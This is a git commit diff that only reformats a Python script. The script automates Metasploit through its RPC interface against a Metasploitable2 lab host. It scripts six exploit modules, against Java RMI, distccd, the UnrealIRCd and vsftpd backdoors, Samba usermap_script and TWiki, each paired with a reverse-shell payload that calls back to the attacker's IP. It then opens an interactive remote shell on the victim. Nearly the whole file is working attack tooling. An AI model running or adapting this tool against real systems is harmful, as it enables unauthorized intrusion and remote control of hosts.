552632afa4c7bc1a1f632407deb1eb88aca1457e
soytupadrrre <victorluque314@gmail.com>
2023-02-18 19:55:59 +0100

    HPP2 Formatted

--- hacking_python/hpp2.py
+++ hacking_python/hpp2.py
@@ -1,8 +1,10 @@
 import subprocess
 import time
 import sys
-import netifaces # pip install netifaces
-from pymetasploit3.msfrpc import MsfRpcClient, SessionManager # pip install pymetasploit3
+import netifaces  # pip install netifaces
+# pip install pymetasploit3
+from pymetasploit3.msfrpc import MsfRpcClient, SessionManager
+
 
 class PyMetasploit:
     def __init__(self, msfclient, attacker_ip):
@@ -55,7 +57,7 @@ class PyMetasploit:
         while cont < 3:
             for k, v in self.msfclient.sessions.list.items():
                 if self.exploit.modulename in v["via_exploit"] and\
-                    self.payload.modulename in v["via_payload"]:
+                        self.payload.modulename in v["via_payload"]:
                     print(f"Found Session Id: {k}")
                     sid = k
             if sid is not None:
@@ -78,14 +80,14 @@ class PyMetasploit:
         try:
             shell.write("whoami")
             user = f"({shell.read().strip()}@{victim_ip})"
-        except:
+        except Exception:
             user = f"({victim_ip})"
         finally:
-            text += user 
+            text += user
         try:
             shell.write("pwd")
             dir_ = f"[{shell.read().strip()}]"
-        except:
+        except Exception:
             dir_ = ""
         finally:
             if dir_:
@@ -96,9 +98,11 @@ class PyMetasploit:
         return text
 
     def _end_session(self, sid):
-        close = default_input(f"Do you want to close the session {sid}? [y/N] ", default="N")
+        close = default_input(
+            f"Do you want to close the session {sid}? [y/N] ", default="N")
         while close not in ["y", "Y", "N", "n"]:
-            close = default_input(f"Do you want to close the session {sid}? [y/N] ", default="N")
+            close = default_input(
+                f"Do you want to close the session {sid}? [y/N] ", default="N")
         if close in ["y", "Y"] and sid:
             session = self.session_manager.session(sid)
             session.stop()
@@ -120,9 +124,11 @@ class PyMetasploit:
             stdout = shell.read().strip()
             if stdout:
                 print(stdout)
-            command = input(self._pretty_cli(shell, victim_ip, need_refresh=False))
-        
+            command = input(self._pretty_cli(
+                shell, victim_ip, need_refresh=False))
+
         self._end_session(sid)
+
 
 class VictimHost:
     _exploit_choices = {}
@@ -136,12 +142,14 @@ class VictimHost:
         return {str(i): v for i, v in enumerate(list(self._exploit_choices.keys()))}
 
     def _check_host_reachable(self):
-        result = subprocess.call(["ping", "-c", "1", "-w", "1", self.victim_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        result = subprocess.call(["ping", "-c", "1", "-w", "1", self.victim_ip],
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         if result != 0:
             raise ConnectionError("Host is not reachable")
-    
+
     def select_exploit(self, name):
         return self._exploit_choices.get(name, None)
+
 
 class Metasploitable2(VictimHost):
     def __init__(self, victim_ip) -> None:
@@ -156,44 +164,57 @@ class Metasploitable2(VictimHost):
         }
 
     def _exploit_java_rmi_server(self, metasploit: PyMetasploit):
-        metasploit.set_exploit(name="multi/misc/java_rmi_server", rhosts=self.victim_ip, rport=1099)
-        metasploit.set_payload(name="java/shell/reverse_tcp", lhost=metasploit.attacker_ip)
+        metasploit.set_exploit(
+            name="multi/misc/java_rmi_server", rhosts=self.victim_ip, rport=1099)
+        metasploit.set_payload(
+            name="java/shell/reverse_tcp", lhost=metasploit.attacker_ip)
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
-    
+
     def _exploit_distccd(self, metasploit: PyMetasploit):
-        metasploit.set_exploit(name="unix/misc/distcc_exec", rhosts=self.victim_ip, rport=3632)
-        metasploit.set_payload(name="cmd/unix/reverse", lhost=metasploit.attacker_ip)
+        metasploit.set_exploit(name="unix/misc/distcc_exec",
+                               rhosts=self.victim_ip, rport=3632)
+        metasploit.set_payload(name="cmd/unix/reverse",
+                               lhost=metasploit.attacker_ip)
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
     def _exploit_unreal_ircd_3281_backdoor(self, metasploit: PyMetasploit):
-        metasploit.set_exploit(name="unix/irc/unreal_ircd_3281_backdoor", rhosts=self.victim_ip, rport=6667)
-        metasploit.set_payload(name="cmd/unix/reverse", lhost=metasploit.attacker_ip)
+        metasploit.set_exploit(
+            name="unix/irc/unreal_ircd_3281_backdoor", rhosts=self.victim_ip, rport=6667)
+        metasploit.set_payload(name="cmd/unix/reverse",
+                               lhost=metasploit.attacker_ip)
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
     def _exploit_usermap(self, metasploit: PyMetasploit):
-        metasploit.set_exploit(name="multi/samba/usermap_script", rhosts=self.victim_ip, rport=139)
-        metasploit.set_payload(name="cmd/unix/reverse", lhost=metasploit.attacker_ip)
+        metasploit.set_exploit(
+            name="multi/samba/usermap_script", rhosts=self.victim_ip, rport=139)
+        metasploit.set_payload(name="cmd/unix/reverse",
+                               lhost=metasploit.attacker_ip)
         metasploit.set_console()
         metasploit.run(victim_ip=victim_ip)
 
     def _exploit_apache_twiki(self, metasploit: PyMetasploit):
-        metasploit.set_exploit(name="unix/webapp/twiki_history", rhosts=self.victim_ip, rport=80)
-        metasploit.set_payload(name="cmd/unix/reverse", lhost=metasploit.attacker_ip)
+        metasploit.set_exploit(
+            name="unix/webapp/twiki_history", rhosts=self.victim_ip, rport=80)
+        metasploit.set_payload(name="cmd/unix/reverse",
+                               lhost=metasploit.attacker_ip)
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
     def _exploit_vsftpd_234_backdoor(self, metasploit: PyMetasploit):
-        metasploit.set_exploit(name="unix/ftp/vsftpd_234_backdoor", rhosts=self.victim_ip, rport=21)
+        metasploit.set_exploit(
+            name="unix/ftp/vsftpd_234_backdoor", rhosts=self.victim_ip, rport=21)
         metasploit.set_payload(name="cmd/unix/interact")
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
+
 def default_input(text, default=""):
     result = input(text)
     return result if result else default
+
 
 def suggest_local_ip():
     interfaces = netifaces.interfaces()
@@ -205,6 +226,7 @@ def suggest_local_ip():
                     # Found a private network address
                     return address['addr']
     return None
+
 
 def exploit_menu(victim: VictimHost):
     text = "ID\t| Payload\n"
@@ -218,14 +240,15 @@ def exploit_menu(victim: VictimHost):
             break
         for k, v in victim.available_exploits.items():
             if selected.lower() == k or selected.lower() == v:
-                return v            
+                return v
 
-    
 
 if __name__ == "__main__":
-    msfclient = MsfRpcClient(default_input("MSGRPC pwd (default: password): ", "password"), port=55552)
+    msfclient = MsfRpcClient(default_input(
+        "MSGRPC pwd (default: password): ", "password"), port=55552)
     local_ip = suggest_local_ip()
-    metasploit = PyMetasploit(msfclient, default_input(f"Your attacker IP (default: {local_ip}): ", f"{local_ip}"))
+    metasploit = PyMetasploit(msfclient, default_input(
+        f"Your attacker IP (default: {local_ip}): ", f"{local_ip}"))
     victim_ip = default_input("Metasploitable2 IP Address: ", "192.168.28.145")
     metasploitable2 = Metasploitable2(victim_ip)
 
@@ -234,10 +257,11 @@ if __name__ == "__main__":
             name = exploit_menu(metasploitable2)
             if name:
                 exploitation = metasploitable2.select_exploit(name)(metasploit)
-                action = default_input("Continue exploiting? [Y/n]: ", default="Y")
+                action = default_input(
+                    "Continue exploiting? [Y/n]: ", default="Y")
                 if action in ["n", "N"]:
                     break
             else:
                 break
-        except:
+        except Exception:
             print("Ha habido un error con el servicio MSGRPC, reintentando...")
